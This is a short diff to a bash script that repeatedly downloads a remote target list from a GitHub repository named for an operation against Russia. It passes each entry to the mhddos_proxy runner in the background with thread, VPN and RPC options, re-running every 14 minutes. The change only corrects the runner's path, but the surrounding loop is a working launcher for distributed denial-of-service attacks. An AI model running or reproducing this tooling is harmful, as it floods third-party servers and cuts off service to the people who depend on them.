@@ -23,7 +23,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
-            runner.sh python3 $cmd_line $threads $vpn $rpc $debug&
+            ~/mhddos_proxy/runner.sh python3 $cmd_line $threads $vpn $rpc $debug&
       done
 sleep 14m
 done
